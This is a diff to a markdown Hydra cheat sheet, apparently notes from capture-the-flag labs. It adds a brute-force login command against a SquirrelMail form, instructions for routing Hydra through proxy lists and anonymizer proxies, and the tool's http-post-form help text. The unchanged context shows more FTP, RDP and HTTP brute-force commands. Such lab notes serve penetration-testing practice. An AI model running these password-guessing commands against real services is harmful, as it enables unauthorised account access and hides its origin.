@@ -21,6 +21,11 @@ Syntax: `<url>:<form parameters>[:<optional>[:<optional>]:<condition string>`
 hydra -V -l milesdyson -P log1.txt skynet.thm http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect"
 ```
 
+don't follow found redirects 302s
+```sh
+hydra -V -l milesdyson -P logs/log1.txt skynet.thm http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:2=:F=ERROR" 
+```
+
 ```sh
 hydra -V -t 50 -l admin -P /usr/share/wordlists/fasttrack.txt http-get admin.ironcorp.me -s 11025
 ```
@@ -156,6 +161,44 @@ hydra -V -t 50 -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://10.10.183.10
 hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>
 ```
 
+
+
+### Proxying Hydra
+https://github.com/vanhauser-thc/thc-hydra
+
+The environment variable HYDRA_PROXY_HTTP defines the web proxy (this works
+just for the http services!).
+The following syntax is valid:
+
+```sh
+HYDRA_PROXY_HTTP="[http://123.45.67.89:8080/](http://123.45.67.89:8080/)"
+HYDRA_PROXY_HTTP="http://login:password@123.45.67.89:8080/"
+HYDRA_PROXY_HTTP="proxylist.txt"
+```
+
+The last example is a text file containing up to 64 proxies (in the same
+format definition as the other examples).
+
+For all other services, use the HYDRA_PROXY variable to scan/crack.
+It uses the same syntax. eg:
+
+```sh
+HYDRA_PROXY=[connect|socks4|socks5]://[login:password@]proxy_addr:proxy_port
+```
+
+for example:
+
+```sh
+HYDRA_PROXY=connect://proxy.anonymizer.com:8000
+HYDRA_PROXY=socks4://auth:pw@127.0.0.1:1080
+HYDRA_PROXY=socksproxylist.txt
+```
+
+For BURP:
+```sh
+export HYDRA_PROXY_HTTP='http://localhost:8080'
+```
+
 ### Help
 
 ```sh
@@ -223,6 +266,68 @@ Examples:
 
 ```
 
+### Help - http-post-form
+
+```sh
+┌──(kali㉿kali)-[~/thm/skynet]
+└─$ hydra http-post-form -U
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-17 15:30:43
+
+Help for module http-post-form:
+============================================================================
+Module http-post-form requires the page and the parameters for the web form.
+
+By default this module is configured to follow a maximum of 5 redirections in
+a row. It always gathers a new cookie from the same URL without variables
+The parameters requires at a minimum three ":" separated values,
+plus optional values.
+(Note: if you need a colon in the option string as value, escape it with "\:", but do not escape a "\"" with "\\".)
+
+Syntax: <url>:<form parameters>[:<optional>[:<optional>]:<condition string>
+
+First is the page on the server to GET or POST to (URL), e.g. "/login".
+Second is the POST/GET variables (taken from either the browser, proxy, etc.)
+ without the initial '?' character and the usernames and passwords being
+ replaced with "^USER^" ("^USER64^" for base64 encodings) and "^PASS^"
+ ("^PASS64^" for base64 encodings).
+Third are optional parameters (see below)
+Last is the string that it checks for an *invalid* login (by default).
+ Invalid condition login check can be preceded by "F=", successful condition
+ login check must be preceded by "S=".
+ This is where most people get it wrong! You have to check the webapp what a
+ failed string looks like and put it in this parameter! Add the -d switch to see
+ the sent/received data!
+ Note that using invalid login condition checks can result in false positives!
+
+The following parameters are optional and are put between the form parameters
+  and the condition string; seperate them too with colons:
+ 2=                  302 page forward return codes identify a successful attempt
+ (c|C)=/page/uri     to define a different page to gather initial cookies from
+ (g|G)=              skip pre-requests - only use this when no pre-cookies are required
+ (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
+                 ^USER[64]^ and ^PASS[64]^ can also be put into these headers!
+                 Note: 'h' will add the user-defined header at the end
+                 regardless it`s already being sent by Hydra or not.
+                 'H' will replace the value of that header if it exists, by the
+                 one supplied by the user, or add the header at the end
+
+Note that if you are going to put colons (:) in your headers you should escape
+them with a backslash (\). All colons that are not option separators should be
+escaped (see the examples above and below).
+You can specify a header without escaping the colons, but that way you will not
+be able to put colons in the header value itself, as they will be interpreted by
+hydra as option separators.
+
+Examples:
+ "/login.php:user=^USER^&pass=^PASS^:incorrect"
+ "/login.php:user=^USER64^&pass=^PASS64^&colon=colon\:escape:S=result=success"
+ "/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
+ "/:user=^USER&pass=^PASS^:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^:H=User-Agent\: wget"
+ "/exchweb/bin/auth/:F=failedowaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:C=/exchweb":reason=
+
+```
 ### Help - http-get-form
 
 ```sh
